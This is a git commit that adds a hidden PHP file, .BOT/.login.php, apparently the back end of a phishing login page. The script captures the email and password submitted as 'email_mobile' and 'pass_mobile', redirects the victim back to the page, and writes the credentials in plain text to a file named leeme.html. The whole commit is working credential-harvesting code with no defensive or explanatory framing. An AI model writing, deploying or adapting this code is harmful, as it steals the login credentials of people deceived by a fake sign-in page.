4c842e119641e466dfd9166b05f587cc3966e078
Cesar-Hack-Gray <cesarhackergray.az.az82@gmail.com>
2019-12-02 12:55:04 -0600

    Archivos php

---
+++ .BOT/.login.php
@@ -0,0 +1,16 @@
+<?php
+$email = test_input($_POST["email_mobile"]);
+$data['email_mobile']=$email;
+$pass = test_input($_POST["pass_mobile"]);
+$data['pass_mobile']=$pass;
+
+
+header ('Location: '.htmlspecialchars($_SERVER["PHP_SELF"]));
+$handle = fopen("leeme.html", "a");
+$string = '
+email:'.$data['email_mobile'].'
+pass:'.$data['pass_mobile'];
+
+fwrite($handle,$string);
+fclose($handle);
+
